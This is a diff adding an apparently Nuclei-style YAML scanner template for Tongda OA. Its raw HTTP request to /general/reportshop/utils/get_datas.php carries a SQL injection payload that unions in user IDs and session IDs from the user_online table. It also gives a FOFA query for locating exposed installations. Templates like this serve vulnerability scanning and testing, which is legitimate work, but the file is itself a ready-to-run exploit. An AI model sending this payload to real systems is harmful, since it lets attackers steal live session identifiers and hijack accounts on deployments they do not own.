@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - 1;1
+      matchers-condition: and
+      raw:
+        - |
+          GET /general/reportshop/utils/get_datas.php?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 where 1={\=' 1} union select uid,sid from user_online -- ' HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+id: tongda-oa-get-datas-sqli
+info:
+    author: xy
+    description: 通达OA /general/reportshop/utils/get_datas.php 报错注入
+    metadata:
+        fofa-query: app="TDXK-通达OA"
+        veified: true
+    name: tongda-oa-get-datas-sqli
+    reference:
+        - null
+    severity: high
+    tags:
+        - tongda
+        - 通达oa
+        - TDXK-通达OA
